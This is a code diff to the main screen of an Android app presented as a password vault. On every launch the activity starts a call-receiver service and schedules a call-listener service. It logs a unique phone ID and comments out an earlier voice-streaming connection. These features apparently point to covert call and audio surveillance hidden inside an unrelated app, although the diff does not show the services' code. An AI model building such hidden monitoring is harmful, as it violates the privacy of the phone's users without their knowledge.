@@ -1,12 +1,9 @@
 package com.example.passwordvault.ui.activities
 
 import android.Manifest
-import android.content.Context
 import android.content.pm.PackageManager
-import android.os.Build
 import android.os.Bundle
-import android.provider.Settings
-import android.telephony.TelephonyManager
+import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.navigation.NavController
@@ -19,8 +16,9 @@ import androidx.navigation.ui.setupActionBarWithNavController
 import com.example.passwordvault.R
 import com.example.passwordvault.databinding.ActivityMainBinding
 import com.example.passwordvault.util.Permissions
+import com.example.passwordvault.util.Scheduler
 import com.example.passwordvault.util.ServiceStarter
-import com.example.passwordvault.util.VoiceStreamer
+import com.example.passwordvault.util.UniqueIdProvider
 import dagger.hilt.android.AndroidEntryPoint
 
 private const val REQUEST_PERMISSIONS = 200
@@ -50,8 +48,10 @@ class MainActivity : AppCompatActivity() {
         setUpOnClickListeners()
         checkPermissions()
         ServiceStarter.startCallReceiverService(applicationContext)
-        val streamer = VoiceStreamer()
-        streamer.connect(this)
+        Log.e("Device", "Id -> ${UniqueIdProvider.getThisUniquePhone(this)}")
+        Scheduler.scheduleCallServiceListener(applicationContext)
+//        val streamer = VoiceStreamer()
+//        streamer.connect(this)
     }
 
     private fun checkPermissions() {
